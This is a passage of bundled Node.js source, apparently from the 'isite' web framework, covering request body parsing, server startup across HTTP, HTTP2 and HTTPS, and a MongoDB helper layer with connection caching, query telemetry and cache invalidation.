                                        req.params[map.name] = decodeURIComponent(req.urlParser.arr[map.index].replace(/\+/g, ' '));
                                    } catch (error) {
                                        req.params[map.name] = req.urlParser.arr[map.index].replace(/\+/g, ' ');
                                    }
                                    req.paramsRaw[map.name] = req.urlParserRaw.arr[map.index];
                                }
                            }
                        }

                        req.session = {
                            $save: () => {},
                            accessToken: 'SHARED',
                            language: ____0.options.language || { id: 'En', dir: 'ltr', text: 'left' },
                            lang: ____0.options.language?.id || ____0.options.lang || 'En',
                        };

                        req.query = req.urlParser.query;
                        req.queryRaw = req.urlParserRaw.query;

                        ____0.validateRoute(req, res, (req, res) => {
                            if (req.method.like('options') || req.method.like('head')) {
                                res.set('Content-Length', 50 * 1000);
                                res.status(200).end();
                                return;
                            }
                            if (!req.method.like('get') && req.headers[____0.strings[18]] && req.headers[____0.strings[18]].match(/urlencoded/i)) {
                                req.on('data', function (data) {
                                    req.appendBody(data);
                                });
                                req.on('end', function () {
                                    if (req.bodyTooLarge) return;
                                    req.dataRaw = req.bodyRaw;
                                    req.data = req.body = ____0.querystring.parse(req.bodyRaw);
                                    if (____0.options.session.enabled) {
                                        ____0.session(req, res, ____0, function (session) {
                                            req.session = session;
                                            ____0.validateSession(req, res, (req, res) => {
                                                _0xrrxo.handleRoute(req, res, req.route);
                                            });
                                        });
                                    } else {
                                        _0xrrxo.handleRoute(req, res, req.route);
                                    }
                                });
                            } else if (!req.method.contains('get') && req.headers[____0.strings[18]] && req.headers[____0.strings[18]].contains('multipart')) {
                                let form = ____0.formidable({
                                    multiples: !0,
                                    uploadDir: ____0.options.upload_dir,
                                    maxFieldsSize: req.maxBodyBytes,
                                    maxFileSize: (____0.options.request && ____0.options.request.maxFileBytes) || 50 * 1024 * 1024,
                                });

                                form.parse(req, (err, fields, files) => {
                                    if (err) {
                                        ____0.log(err);
                                    }
                                    req.form = { err, fields, files };
                                    req.data = req.body = fields || {};
                                    req.files = files;
                                    if (____0.options.session.enabled) {
                                        ____0.session(req, res, ____0, function (session) {
                                            req.session = session;
                                            ____0.validateSession(req, res, (req, res) => {
                                                _0xrrxo.handleRoute(req, res, req.route);
                                            });
                                        });
                                    } else {
                                        _0xrrxo.handleRoute(req, res, req.route);
                                    }
                                });

                                return;
                            } else if (!req.method.like('get') && req.headers[____0.strings[18]] && req.headers[____0.strings[18]].match(/json/i)) {
                                req.on('data', function (data) {
                                    req.appendBody(data);
                                });
                                req.on('end', function () {
                                    if (req.bodyTooLarge) return;
                                    req.dataRaw = req.bodyRaw;

                                    req.data = req.body = ____0.fromJson(req.bodyRaw);
                                    if (____0.options.session.enabled) {
                                        ____0.session(req, res, ____0, function (session) {
                                            req.session = session;
                                            ____0.validateSession(req, res, (req, res) => {
                                                _0xrrxo.handleRoute(req, res, req.route);
                                            });
                                        });
                                    } else {
                                        _0xrrxo.handleRoute(req, res, req.route);
                                    }
                                });
                            } else if (!req.method.like('get')) {
                                req.on('data', function (data) {
                                    req.appendBody(data);
                                });
                                req.on('end', function () {
                                    if (req.bodyTooLarge) return;
                                    req.dataRaw = req.bodyRaw;
                                    req.data = req.body = ____0.fromJson(req.bodyRaw);
                                    if (____0.options.session.enabled) {
                                        ____0.session(req, res, ____0, function (session) {
                                            req.session = session;
                                            ____0.validateSession(req, res, (req, res) => {
                                                _0xrrxo.handleRoute(req, res, req.route);
                                            });
                                        });
                                    } else {
                                        _0xrrxo.handleRoute(req, res, req.route);
                                    }
                                });
                            } else {
                                req.body = req.data = req.query;
                                req.bodyRaw = req.dataRaw = req.queryRaw;

                                if (____0.options.session.enabled) {
                                    ____0.session(req, res, ____0, function (session) {
                                        req.session = session;
                                        ____0.validateSession(req, res, (req, res) => {
                                            _0xrrxo.handleRoute(req, res, req.route);
                                        });
                                    });
                                } else {
                                    _0xrrxo.handleRoute(req, res, req.route);
                                }
                                return;
                            }
                        });

                        return;
                    } else {
                        if (req.urlParser.pathname == '/') {
                            if (____0.options.help) {
                                res.set('help-eror-message', 'unhandled route root : ' + req.urlParser.pathname);
                            }
                            res.htmlContent("<h1 align='center'>Base Route / Not Set</h1>");
                            return;
                        }

                        if (____0.options.help) {
                            res.set('help-eror-message', 'unhandled route help : ' + req.urlParser.pathname);
                        }

                        if (req.method.like('options') || req.method.like('head')) {
                            res.set('Content-Length', 50 * 1000);
                            res.status(200).end();
                            return;
                        }
                        ____0.handleNotRoute(req, res);
                    }
                } else {
                    ____0.handleNotRoute(req, res);
                }
            });
        });
    };

    ____0.handleNotRoute = function (req, res) {
        res.set('help-eror-message', 'handleNotRoute() : ' + req.urlParser.pathname);
        res.status(404).end();
    };
    ____0.servers = [];
    ____0.server = null;
    ____0.serverCount = 0;
    _0xrrxo.start = function (_ports, callback) {
        ____0.startTime = Date.now();
        if (typeof _ports === 'function') {
            callback = callback || _ports;
            _ports = null;
        }

        // Do not touch TLS files or load node:https on the normal HTTP startup
        // path. Historically these files were read synchronously even when
        // HTTPS was disabled, adding startup I/O and making HTTP-only servers
        // depend on certificate files they never use.
        if (____0.options.https && ____0.options.https.enabled) {
            ____0.https.globalAgent.options = {
                key: ____0.fs.readFileSync(____0.options.https.key || __dirname + '/../ssl/key.pem'),
                cert: ____0.fs.readFileSync(____0.options.https.cert || __dirname + '/../ssl/cert.pem'),
            };
        }

        const ports = [];

        if (ports.length === 0) {
            if (typeof _ports === 'number') {
                ports.some((p0) => p0 == _ports) || ports.push(_ports);
            } else if (Array.isArray(_ports)) {
                _ports.forEach((p) => {
                    ports.some((p0) => p0 == p) || ports.push(p);
                });
            }
        }
        if (ports.length === 0) {
            if (typeof ____0.options.port === 'number') {
                ports.some((p0) => p0 == ____0.options.port) || ports.push(____0.options.port);
            } else if (Array.isArray(____0.options.port)) {
                ____0.options.port.forEach((p) => {
                    ports.some((p0) => p0 == p) || ports.push(p);
                });
            }
        }

        let primaryReadyCount = 0;
        let primaryReadyDone = false;
        const primaryReady = function () {
            primaryReadyCount++;
            ____0.serverCount = primaryReadyCount;
            if (!primaryReadyDone && primaryReadyCount >= ports.length) {
                primaryReadyDone = true;
                ____0.call(____0.strings[9]);
                if (callback) callback(____0.servers);
                // The outbound integration websocket is not required for the
                // HTTP socket to accept requests. Start it after readiness so
                // loading `ws` and opening an external connection are removed
                // from server.start's critical path.
                if (____0.ws && typeof ____0.ws.wsSupport === 'function') {
                    const defer = typeof setImmediate === 'function' ? setImmediate : (fn) => setTimeout(fn, 0);
                    defer(() => {
                        try {
                            const pending = ____0.ws.wsSupport();
                            if (pending && typeof pending.catch === 'function') pending.catch(() => {});
                        } catch (_) {}
                    });
                }
            }
        };

        ports.forEach((p, i) => {
            try {
                if (____0.options.http2) {
                    let server = ____0.http2.createServer();
                    server.on('error', (err) => { ____0.log(err); primaryReady(); });
                    server.on('listening', () => {
                        if (!____0.server) ____0.server = server;
                        ____0.servers.push(server);
                        primaryReady();
                    });
                    server.on('stream', (stream, headers) => {
                        // _0xrrxo.handleStream(stream , headers , server);
                        let path = headers[':path'];
                        let method = headers[':method'];
                        if (stream.closed) {
                            return;
                        }
                        stream.respond({
                            ':status': 200,
                        });
                        stream.write('isite http2 worked but not implement routes ...');
                        stream.end();
                    });
                    server.listen(p);
                } else {
                    let server = ____0.http.createServer(_0xrrxo.handleServer);
                    server.maxHeadersCount = 0;
                    server.timeout = 1000 * ____0.options.responseTimeout;
                    server.on('error', (e) => {
                        if (e.code === 'EADDRINUSE') {
                            ____0.log('Address in use, Closing Server : ' + p);
                            server.close();
                        }
                        primaryReady();
                    });
                    server.listen(p, function () {
                        if (!____0.server) {
                            ____0.server = server;
                        }
                        ____0.servers.push(server);
                        ____0.log('\n-----------------------------------------');
                        ____0.log(` ( ${____0.options.name} ) Running on : http://${____0.options.hostname}:${p} `);
                        ____0.log('-----------------------------------------\n');
                        primaryReady();
                    });
                }
            } catch (error) {
                ____0.log(error);
            }
        });

        ____0.options.port = ports;

        if (____0.options.https.enabled) {
            if (typeof ____0.options.https.port === 'number') {
                ____0.options.https.ports = [____0.options.https.port];
            }
            if (Array.isArray(____0.options.https.ports) && ____0.options.https.ports.length > 0) {
                ____0.options.https.ports.forEach((p, i) => {
                    let server = ____0.https.createServer(_0xrrxo.handleServer);
                    server.maxHeadersCount = 0;
                    server.timeout = 1000 * ____0.options.responseTimeout;
                    server.on('error', (e) => {
                        if (e.code === 'EADDRINUSE') {
                            ____0.log('Address in use, Closing Server : ' + p);
                            server.close();
                        }
                    });
                    server.listen(p, function () {
                        ____0.servers.push(server);
                        ____0.log('');
                        ____0.log('-----------------------------------------');
                        ____0.log('    ' + ____0.options.name + ' [ https ] Running on Port : ' + p);
                        ____0.log('-----------------------------------------');
                        ____0.log('');
                    });
                });
            }
        }

        // Compatibility: keep the public property, but startup readiness is
        // now event-driven rather than polled every 100ms.
        ____0.readyInterval = null;

        return ____0.server;
    };

    return _0xrrxo;
};

return module.exports; })();

const vars = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(____0) {
  ____0.vars = []

  ____0.addVar = function(name, value) {
    for (let i = 0; i < ____0.vars.length; i++) {
      let v = ____0.vars[i]
      if (____0.vars[i].name == name) {
        ____0.vars[i].value = value
        return
      }
    }

    ____0.vars.push({
      name: name,
      value: value
    })
  }
  ____0.getVar = function(name) {
    for (let i = 0; i < ____0.vars.length; i++) {
      let v = ____0.vars[i]
      if (v.name == name) {
        return v.value
      }
    }
    return null
  }

  ____0.var = function(name, value) {
    if (value) {
      return ____0.addVar(name, value)
    } else {
      return ____0.getVar(name)
    }
  }

  ____0.addVars = function(path){
    ____0.readFile(path, (err, file) => {
      if (!err) {
        let vars = JSON.parse(file.content)
        for (let i = 0; i < vars.length; i++) {
          ____0.vars.push(vars[i])
        }
      }
    })
  }

  ____0.addVars(____0.dir + "/json/vars.json")

}

return module.exports; })();

const mongodb = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(____0) {
  let mongodb = null;
  const getMongo = function () { return mongodb || (mongodb = require('mongodb')); };

  let url = '';
  if (!____0.options.mongodb.url) {
    url = ____0.options.mongodb.host + ':' + ____0.options.mongodb.port;
    if (____0.options.mongodb.username && ____0.options.mongodb.password) {
      url = encodeURIComponent(____0.options.mongodb.username) + ':' + encodeURIComponent(____0.options.mongodb.password) + '@' + ____0.options.mongodb.host + ':' + ____0.options.mongodb.port;
    }
    url = ____0.options.mongodb.protocal + url;
  } else {
    url = encodeURI(____0.options.mongodb.url);
  }

  const _mongo = function () {};
  _mongo.callback = function (...args) {
    ____0.log(...args);
  };

  Object.defineProperty(_mongo, 'lib', { enumerable: true, get: getMongo });
  Object.defineProperty(_mongo, 'ObjectId', { enumerable: true, get: function () { return getMongo().ObjectId; } });
  _mongo.ObjectID = function (_id) {
    if (_id && typeof _id === 'string' && /^[a-fA-F0-9]{24}$/.test(_id)) {
      try {
        return new (getMongo().ObjectId)(_id);
      } catch (error) {
        console.error(error);
        return new (getMongo().ObjectId)();
      }
    }
    return new (getMongo().ObjectId)();
  };
  _mongo.connection = url;
  _mongo.collections_indexed = [];
  // v4: O(1) connection indexes while preserving legacy databaseList arrays.
  _mongo.databaseIndex = new Map();
  _mongo.collectionIndex = new Map();
  _mongo.databaseInflight = new Map();
  _mongo.collectionInflight = new Map();

  // v5: invalidate only the new opt-in query cache after successful writes.
  _mongo.observeQuery = function (obj, operation) {
    try {
      if (!____0.mongoAdvisor || !obj) return null;
      const dbName = obj.dbName === undefined ? ____0.options.mongodb.db : obj.dbName;
      return ____0.mongoAdvisor.record(String(dbName) + '.' + String(obj.collectionName), operation, { where: obj.where || {}, sort: obj.sort || {} });
    } catch (_) { return null; }
  };


  // v9: execution telemetry is observability-only and never changes query behavior.
  _mongo.telemetryStart = function (obj, operation) {
    if (!____0.mongoTelemetry || !obj) return null;
    const dbName = obj.dbName === undefined ? ____0.options.mongodb.db : obj.dbName;
    const collection = String(dbName) + '.' + String(obj.collectionName);
    const shape = ____0.mongoShapes && typeof ____0.mongoShapes.begin === 'function'
      ? ____0.mongoShapes.begin(collection, String(operation), obj)
      : null;
    return { startedAt: process.hrtime.bigint(), collection, operation: String(operation), shape };
  };
  _mongo.telemetryEnd = function (token, extra) {
    if (!token || !____0.mongoTelemetry) return null;
    const ms = Number(process.hrtime.bigint() - token.startedAt) / 1e6;
    const payload = { collection: token.collection, operation: token.operation, ms, ...(extra || {}) };
    const row = ____0.mongoTelemetry.record(payload);
    if (token.shape && ____0.mongoShapes && typeof ____0.mongoShapes.end === 'function') {
      ____0.mongoShapes.end(token.shape, payload);
      if (row && typeof row === 'object') row.shapeKey = token.shape.key;
    }
    return row;
  };

  _mongo.invalidateQueryCache = function (obj) {
    if (!____0.query || typeof ____0.query.invalidate !== 'function' || !obj) return 0;
    const dbName = obj.dbName === undefined ? ____0.options.mongodb.db : obj.dbName;
    return ____0.query.invalidate(String(dbName) + '.' + String(obj.collectionName));
  };

  // v10: query-cache invalidation is preserved, while response-cache
  // invalidation occurs only for collections explicitly bound by new code.
  _mongo.invalidateWriteCaches = function (obj, operation) {
    const query = _mongo.invalidateQueryCache(obj);
    let response = null;
    if (____0.responseCache && typeof ____0.responseCache.invalidateCollection === 'function' && obj) {
      const dbName = obj.dbName === undefined ? ____0.options.mongodb.db : obj.dbName;
      response = ____0.responseCache.invalidateCollection(String(dbName) + '.' + String(obj.collectionName), { operation: String(operation || 'write') });
    }
    return { query, response };
  };

  //ulimit -n 10000

  _mongo.closeDbBusy = !1;
  ____0.on('[close-database]', (args, callback) => {
    callback = callback || _mongo.callback;

    if (_mongo.closeDbBusy == !0) {
      setTimeout(() => {
        ____0.call('[close-database]', args, callback);
      }, 2000);
      return;
    }

    if (____0.databaseList.length === 0) {
      callback();
      return;
    }

    _mongo.closeDbBusy = !0;
    console.log('Closing mongodb Connection Count : ' + ____0.databaseList.length);
    for (let i = 0; i < ____0.databaseList.length; i++) {
      console.log('Closing Database : ' + ____0.databaseList[i].name);
      ____0.databaseList[i].client.close();
      if (____0.databaseList[i]) ____0.databaseList[i].connected = false;
    }

    setTimeout(() => {
      _mongo.databaseIndex.clear();
      _mongo.collectionIndex.clear();
      _mongo.databaseInflight.clear();
      _mongo.collectionInflight.clear();
      _mongo.closeDbBusy = !1;
      callback();
    }, 1000);
  });

  _mongo.handleDoc = function (doc, $badLetter = '$') {

    if (!doc) {
      return doc;
    }

    if (typeof doc === 'object') {
      
      delete doc.$req;
      delete doc.$res;

      if ($badLetter) {
        doc = ____0.removeRefObject(doc);
      }

      for (let key in doc) {
        if (key === '_id') {
          if (doc[key] && typeof doc[key] === 'string' && /^[a-fA-F0-9]{24}$/.test(doc[key])) {
            doc[key] = _mongo.ObjectID(doc[key]);
          }
        } else if (key === 'id') {
        } else if (typeof key === 'string' && $badLetter && key.indexOf($badLetter) === 0) {
          delete doc[key];
        } else if (Array.isArray(doc[key])) {
          doc[key].forEach((v, i) => {
            if (v && typeof v === 'object') {
              doc[key][i] = _mongo.handleDoc(v, $badLetter);
            }
          });
        } else if (typeof doc[key] === 'object' && doc[key]) {
          doc[key] = _mongo.handleDoc(doc[key], $badLetter);
        } else if (typeof doc[key] === 'string' && ____0.fn.isDate(doc[key])) {
          doc[key] = ____0.getDateTime(doc[key]);
        }
      }
    }

    return doc;
  };

  // v4: connection establishment is de-duplicated per database/collection.
  // The callback API is intentionally unchanged; different databases no longer
  // block each other behind one global busy flag + polling timer.
  _mongo.connectDBBusy = !1; // legacy observable flag retained
  _mongo.connectDB = function (name, callback) {
    callback = callback || _mongo.callback;
    name = name === undefined ? ____0.options.mongodb.db : name;

    if (!____0.options.mongodb.enabled) {
      callback({ message: 'mongodb Not Enabled' }, null);
      return;
    }

    const cached = _mongo.databaseIndex.get(String(name));
    if (cached && cached.connected !== false) {
      callback(null, cached.db);
      return;
    }

    // Backfill the v4 index if external/legacy code populated databaseList.
    if (!cached) {
      const legacy = ____0.databaseList.find((item) => item && item.name === name);
      if (legacy) {
        _mongo.databaseIndex.set(String(name), legacy);
        callback(null, legacy.db);
        return;
      }
    }

    const key = String(name);
    let pending = _mongo.databaseInflight.get(key);
    if (!pending) {
      const db_name = ____0.options.mongodb.prefix.db + name;
      const db_url = _mongo.connection;
      ____0.log('\n ( Connecting DB : ' + db_url + ' ) \n');
      _mongo.connectDBBusy = !0;
      pending = (async () => {
        const mongodbClient = new (getMongo().MongoClient)(db_url, {
          serverSelectionTimeoutMS: 1000 * 10,
          timeoutMS: 1000 * 10,
          waitQueueTimeoutMS: 1000 * 10,
          connectTimeoutMS: 1000 * 10,
          socketTimeoutMS: 1000 * 10,
          maxConnecting: 1,
          ...____0.options.mongodb.config,
        });
        const client = await mongodbClient.connect();
        const db = client.db(db_name);
        const entry = { name, db_name, url: db_url, db, client, connected: !0 };
        ____0.databaseList.push(entry);
        _mongo.databaseIndex.set(key, entry);
        ____0.log('\n ( Connected DB : ' + db_name + ' ) : ' + db_url + '\n');
        return db;
      })().finally(() => {
        _mongo.databaseInflight.delete(key);
        _mongo.connectDBBusy = _mongo.databaseInflight.size > 0;
      });
      _mongo.databaseInflight.set(key, pending);
    }
    pending.then((db) => callback(null, db)).catch((err) => { ____0.log(err); callback(err, null); });
  };

  _mongo.connectCollectionBusy = !1; // legacy observable flag retained
  _mongo.connectCollection = function (options, callback) {
    callback = callback || _mongo.callback;
    options = options || {};
    if (options.collectionName === undefined) options.collectionName = ____0.options.mongodb.collection;
    const name = ____0.options.mongodb.prefix.collection + options.collectionName;
    const dbKey = options.dbName === undefined ? ____0.options.mongodb.db : options.dbName;
    const key = String(dbKey) + '\0' + String(name);

    const cached = _mongo.collectionIndex.get(key);
    if (cached) { callback(null, cached); return; }

    // Backward-compatible fallback for old list entries that did not record dbName.
    const legacy = ____0.databaseCollectionList.find((item) => item && item.name == name && (item.dbName === undefined || item.dbName == dbKey));
    if (legacy) {
      _mongo.collectionIndex.set(key, legacy.collection);
      callback(null, legacy.collection);
      return;
    }

    let pending = _mongo.collectionInflight.get(key);
    if (!pending) {
      _mongo.connectCollectionBusy = !0;
      pending = new Promise((resolve, reject) => {
        _mongo.connectDB(dbKey, function (err, db) {
          if (err) return reject(err);
          try {
            const collection = db.collection(name);
            ____0.databaseCollectionList.push({ name, dbName: dbKey, collection });
            _mongo.collectionIndex.set(key, collection);
            resolve(collection);
          } catch (error) { reject(error); }
        });
      }).finally(() => {
        _mongo.collectionInflight.delete(key);
        _mongo.connectCollectionBusy = _mongo.collectionInflight.size > 0;
      });
      _mongo.collectionInflight.set(key, pending);
    }
    pending.then((collection) => callback(null, collection)).catch((err) => callback(err, null));
  };

  _mongo.createIndex = function (options, callback) {
    callback = callback || _mongo.callback;
    _mongo.connectCollection(options, function (err, collection) {
      if (!err) {
        collection
          .createIndex(options.obj, options.option)
          .then((result) => {
            callback(null, result);
          })
          .catch((err) => {
            callback(err);
          });
      } else {
        callback(err);
      }
    });
  };

  _mongo.dropIndex = function (options, callback) {
    callback = callback || _mongo.callback;
    _mongo.connectCollection(options, function (err, collection) {
      if (!err) {
        collection
          .dropIndex(options.obj, options.option)
          .then((result) => {
            callback(null, result);
          })
          .catch((err) => {
            callback(err);
          });
      } else {
        callback(err);
      }
    });
  };

  _mongo.dropIndexes = function (options, callback) {
    callback = callback || _mongo.callback;
    _mongo.connectCollection(options, function (err, collection) {
      if (!err) {
        collection
          .dropIndexes()
          .then((result) => {
            callback(null, result);
          })
          .catch((err) => {
            callback(err);
          });
      } else {
        callback(err);
      }
    });
  };

  _mongo.aggregate = function (obj, callback) {
    callback = callback || _mongo.callback;
    _mongo.observeQuery(obj, 'aggregate');
    const telemetry = _mongo.telemetryStart(obj, 'aggregate');
    _mongo.connectCollection(obj, function (err, collection) {
      if (!err) {
        collection
          .aggregate(obj.arr)
          .toArray()
          .then((docs) => {
            _mongo.telemetryEnd(telemetry, { nReturned: docs.length });
            callback(null, docs);
          })
          .catch((err) => {
            _mongo.telemetryEnd(telemetry, { error: err });
            callback(err);
          });
      } else {
        _mongo.telemetryEnd(telemetry, { error: err });
        callback(err);
      }
    });
  };

  _mongo.dropCollection = function (obj, callback) {
    callback = callback || _mongo.callback;
    _mongo.connectCollection(obj, function (err, collection) {
      if (!err) {
        collection
          .drop()
          .then((delOK) => {
            callback(null, delOK);
          })
          .catch((err) => {
            callback(err);
          });
      } else {
        callback(err);
      }
    });
  };

  _mongo.insertOne = function (obj, callback) {
    callback = callback || _mongo.callback;
    _mongo.connectCollection(obj, function (err, collection) {
      if (!err) {
        obj.doc = _mongo.handleDoc(obj.doc);

        collection
          .insertOne(obj.doc)
          .then((result) => {
            obj.doc._id = result.insertedId;
            _mongo.invalidateWriteCaches(obj, 'insertOne');
            callback(null, obj.doc, result);
          })
          .catch((err) => {
            callback(err);
          });
      } else {
        callback(err);
      }
    });
  };

  _mongo.insert = _mongo.insertMany = function (obj, callback) {
    callback = callback || _mongo.callback;
    if (!obj.docs || obj.docs.length === 0) {
      callback({
        message: 'docs array length is 0',
      });
      return;
    }
    _mongo.connectCollection(obj, function (err, collection) {
      if (!err) {
        obj.docs.forEach((doc, i) => {
          obj.docs[i] = _mongo.handleDoc(doc);
        });
        collection
          .insertMany(obj.docs, obj.options)
          .then((result) => {
            _mongo.invalidateWriteCaches(obj, 'insertMany');
            callback(null, obj.docs, result);
          })
          .catch((err) => {
            callback(err);
          });
      } else {
        callback(err);
      }
    });
  };

  _mongo.findOne = function (obj, callback) {
    callback = callback || _mongo.callback;
    _mongo.observeQuery(obj, 'findOne');
    const telemetry = _mongo.telemetryStart(obj, 'findOne');

    _mongo.connectCollection(obj, function (err, collection) {
      if (!err) {
        if (obj.where === undefined) {
          callback({
            message: 'where not set',
          });
          return;
        }

        obj.where = _mongo.handleDoc(obj.where, '');

        if (obj.select === undefined) {
          obj.select = {};
        }

        let options = {
          projection: obj.select || {},
          limit: 1,
          skip: obj.skip,
          sort: obj.sort,
        };
        collection
          .findOne(obj.where, options)
          .then((doc) => {
            let err = null;
            _mongo.telemetryEnd(telemetry, { nReturned: doc ? 1 : 0 });
            callback(err, doc);
          })
          .catch((err) => {
            _mongo.telemetryEnd(telemetry, { error: err });
            callback(err);
          });
      } else {
        callback(err);
      }
    });
  };

  _mongo.count = function (obj, callback) {
    callback = callback || _mongo.callback;
    _mongo.observeQuery(obj, 'count');
    const telemetry = _mongo.telemetryStart(obj, 'count');
    _mongo.connectCollection(obj, function (err, collection) {
      if (!err) {
        obj.where = _mongo.handleDoc(obj.where, '');
        collection
          .countDocuments(obj.where)
          .then((count) => {
            _mongo.telemetryEnd(telemetry, { nReturned: Number(count || 0) });
            callback(err, count);
          })
          .catch((err) => {
            _mongo.telemetryEnd(telemetry, { error: err });
            callback(err, 0);
          });
      } else {
        callback(err, 0);
      }
    });
  };

  _mongo.find = _mongo.findMany = function (obj, callback) {
    callback = callback || _mongo.callback;
    _mongo.observeQuery(obj, 'findMany');
    const telemetry = _mongo.telemetryStart(obj, 'findMany');
    _mongo.connectCollection(obj, function (err, collection) {
      if (!err) {
        obj.where = _mongo.handleDoc(obj.where, '');
        collection
          .countDocuments(obj.where)
          .then((count) => {
            if (count > 0) {
              let options = {
                projection: obj.select || {},
                limit: obj.limit ? parseInt(obj.limit) : ____0.options.mongodb.limit,
                skip: obj.skip ? parseInt(obj.skip) : 0,
                sort: obj.sort || null,
              };

              collection
                .find(obj.where, options)
                .toArray()
                .then((docs) => {
                  _mongo.telemetryEnd(telemetry, { nReturned: docs.length });
                  callback(null, docs, count);
                })
                .catch((err) => {
                  _mongo.telemetryEnd(telemetry, { error: err });
                  callback(err, [], 0);
                });
            } else {
              _mongo.telemetryEnd(telemetry, { nReturned: 0 });
              callback(null, [], count);
            }
          })
          .catch((err) => {
            _mongo.telemetryEnd(telemetry, { error: err });
            callback(err, [], 0);
          });
      } else {
        callback(err);
      }
    });
  };

  // v14 additive concurrent count + data read. Legacy findMany remains sequential and untouched.
  _mongo.findManyConcurrent = function (obj, callback) {
    callback = callback || _mongo.callback;
    _mongo.observeQuery(obj, 'findManyConcurrent');
    const telemetry = _mongo.telemetryStart(obj, 'findManyConcurrent');
    _mongo.connectCollection(obj, function (err, collection) {
      if (err) return callback(err, [], 0);
      obj.where = _mongo.handleDoc(obj.where || {}, '');
      const options = {
        projection: obj.select || {},
        limit: obj.limit ? parseInt(obj.limit) : ____0.options.mongodb.limit,
        skip: obj.skip ? parseInt(obj.skip) : 0,
        sort: obj.sort || null,
        ...(obj.maxTimeMS ? { maxTimeMS: Math.max(1, Number(obj.maxTimeMS)) } : {}),
      };
      const countPromise = collection.countDocuments(obj.where, obj.maxTimeMS ? { maxTimeMS: Math.max(1, Number(obj.maxTimeMS)) } : undefined);
      const docsPromise = collection.find(obj.where, options).toArray();
      Promise.all([countPromise, docsPromise])
        .then(([count, docs]) => {
          _mongo.telemetryEnd(telemetry, { nReturned: docs.length });
          callback(null, docs, count);
        })
        .catch((error) => {
          _mongo.telemetryEnd(telemetry, { error });
          callback(error, [], 0);
        });
    });
  };

  // v5 additive single-round-trip read for callers that do not need total count.
  _mongo.findManyFast = function (obj, callback) {
    callback = callback || _mongo.callback;
    _mongo.observeQuery(obj, 'findManyFast');
    const telemetry = _mongo.telemetryStart(obj, 'findManyFast');
    _mongo.connectCollection(obj, function (err, collection) {
      if (err) return callback(err, []);
      obj.where = _mongo.handleDoc(obj.where || {}, '');
      const options = {
        projection: obj.select || {},
        limit: obj.limit ? parseInt(obj.limit) : ____0.options.mongodb.limit,
        skip: obj.skip ? parseInt(obj.skip) : 0,
        sort: obj.sort || null,
        ...(obj.maxTimeMS ? { maxTimeMS: Math.max(1, Number(obj.maxTimeMS)) } : {}),
      };
      collection.find(obj.where, options).toArray().then((docs) => { _mongo.telemetryEnd(telemetry, { nReturned: docs.length }); callback(null, docs); }).catch((error) => { _mongo.telemetryEnd(telemetry, { error }); callback(error, []); });
    });
  };

  // v5 additive page + total-count in one MongoDB round trip via $facet.
  _mongo.findPageFast = function (obj, callback) {
    callback = callback || _mongo.callback;
    _mongo.observeQuery(obj, 'findPageFast');
    const telemetry = _mongo.telemetryStart(obj, 'findPageFast');
    _mongo.connectCollection(obj, function (err, collection) {
      if (err) return callback(err, [], 0);
      obj.where = _mongo.handleDoc(obj.where || {}, '');
      const limit = obj.limit ? parseInt(obj.limit) : ____0.options.mongodb.limit;
      const skip = obj.skip ? parseInt(obj.skip) : 0;
      const data = [];
      if (obj.sort && Object.keys(obj.sort).length) data.push({ $sort: obj.sort });
      if (skip) data.push({ $skip: skip });
      if (limit) data.push({ $limit: limit });
      if (obj.select && Object.keys(obj.select).length) data.push({ $project: obj.select });
      const pipeline = [
        { $match: obj.where },
        { $facet: { data, meta: [{ $count: 'count' }] } },
      ];
      collection.aggregate(pipeline, obj.maxTimeMS ? { maxTimeMS: Math.max(1, Number(obj.maxTimeMS)) } : {}).toArray().then((rows) => {
        const row = rows[0] || { data: [], meta: [] };
        _mongo.telemetryEnd(telemetry, { nReturned: (row.data || []).length });
        callback(null, row.data || [], row.meta?.[0]?.count || 0);
      }).catch((error) => { _mongo.telemetryEnd(telemetry, { error }); callback(error, [], 0); });
    });
  };



  // v6 additive high-throughput helpers. Legacy CRUD methods are unchanged.
  _mongo.findByIdsFast = function (obj, callback) {
    callback = callback || _mongo.callback;
    _mongo.observeQuery(obj, 'findByIdsFast');
    const ids = Array.isArray(obj.ids) ? obj.ids : [];
    if (ids.length === 0) { callback(null, []); return; }
    _mongo.connectCollection(obj, function (err, collection) {
      if (err) return callback(err, []);
      const field = obj.field || 'id';
      const where = _mongo.handleDoc({ ...(obj.where || {}), [field]: { $in: ids } }, '');
      const options = {
        projection: obj.select || {},
        sort: obj.sort || null,
        ...(obj.maxTimeMS ? { maxTimeMS: Math.max(1, Number(obj.maxTimeMS)) } : {}),
      };
      collection.find(where, options).toArray().then((docs) => callback(null, docs)).catch((error) => callback(error, []));
    });
  };

  _mongo.bulkWriteFast = function (obj, callback) {
    callback = callback || _mongo.callback;
    const operations = Array.isArray(obj.operations) ? obj.operations : [];
    if (operations.length === 0) { callback(null, { acknowledged: true, insertedCount: 0, matchedCount: 0, modifiedCount: 0, deletedCount: 0 }); return; }
    _mongo.connectCollection(obj, function (err, collection) {
      if (err) return callback(err);
      collection.bulkWrite(operations, obj.options || {}).then((result) => {
        _mongo.invalidateWriteCaches(obj, 'bulkWriteFast');
        callback(null, result);
      }).catch((error) => callback(error));
    });
  };

  // v9 additive explain helper. It is opt-in and does not execute through
  // legacy collection queues or alter query planner behavior.
  _mongo.explainQuery = function (obj, callback) {
    callback = callback || _mongo.callback;
    _mongo.connectCollection(obj, function (err, collection) {
      if (err) return callback(err, null);
      const where = _mongo.handleDoc(obj.where || {}, '');
      const options = {
        projection: obj.select || {},
        skip: obj.skip ? parseInt(obj.skip) : 0,
        sort: obj.sort || null,
      };
      let cursor = collection.find(where, options);
      if (obj.limit) cursor = cursor.limit(parseInt(obj.limit));
      cursor.explain(obj.verbosity || 'executionStats').then((explain) => {
        const dbName = obj.dbName === undefined ? ____0.options.mongodb.db : obj.dbName;
        if (____0.mongoTelemetry && typeof ____0.mongoTelemetry.recordExplain === 'function') {
          ____0.mongoTelemetry.recordExplain(String(dbName) + '.' + String(obj.collectionName), obj.operation || 'explain', explain);
        }
        callback(null, explain);
      }).catch((error) => callback(error, null));
    });
  };

  _mongo.findCursorFast = function (obj, callback) {
    callback = callback || _mongo.callback;
    _mongo.observeQuery(obj, 'streamFast');
    _mongo.connectCollection(obj, function (err, collection) {
      if (err) return callback(err, null);
      obj.where = _mongo.handleDoc(obj.where || {}, '');
      const options = {
        projection: obj.select || {},
        skip: obj.skip ? parseInt(obj.skip) : 0,
        sort: obj.sort || null,
        batchSize: obj.batchSize ? parseInt(obj.batchSize) : undefined,
